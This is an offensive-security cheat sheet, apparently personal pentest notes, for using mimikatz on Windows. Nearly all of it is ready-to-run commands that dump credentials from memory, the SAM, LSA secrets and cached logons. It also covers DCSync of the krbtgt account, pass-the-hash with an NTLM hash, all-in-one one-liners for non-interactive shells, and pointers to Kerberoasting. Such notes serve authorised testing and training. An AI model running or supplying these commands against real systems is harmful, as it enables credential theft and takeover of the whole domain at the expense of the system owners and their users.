May need to transfer over different versions if you get errors

the one i put in ~/tools/windows is x64

need to run as admin usually

Some things to run
```powershell
privilege::debug

token::elevate

sekurlsa::logonpasswords #hashes and plaintext passwords
sekurlsa::credman # windows credential manager
sekurlsa::ekeys # Kerberos keys
lsadump::sam
lsadump::lsa
lsadump::cache  # Make note of ITERATIONS... see Cracking notes section
lsadump::secrets

lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch #both these dump SAM

#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
BROWSE THE RESULTS CAREFULLY


How to run as other user?
Pth
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
```

If mimikatz gives issues, you can try running earlier versions or run `impacket-secretsdump`


## One-Liners
Note:
If you have a non-interactive shell, you may need to use a mimikatz one-liner as mimikatz.exe alone will just hang
Everything
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::credman" "sekurlsa::ekeys" "lsadump::sam" "lsadump::lsa" "lsadump::cache" "lsadump::secrets" "exit"
```

DCSync
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /domain:<domain> /user:<domain_admin>" "exit"
```


## Afterwards

Be sure to check if any AD attack vectors remain before pivoting. Check bloodhound for asreprostable or kerberostable accounts, etc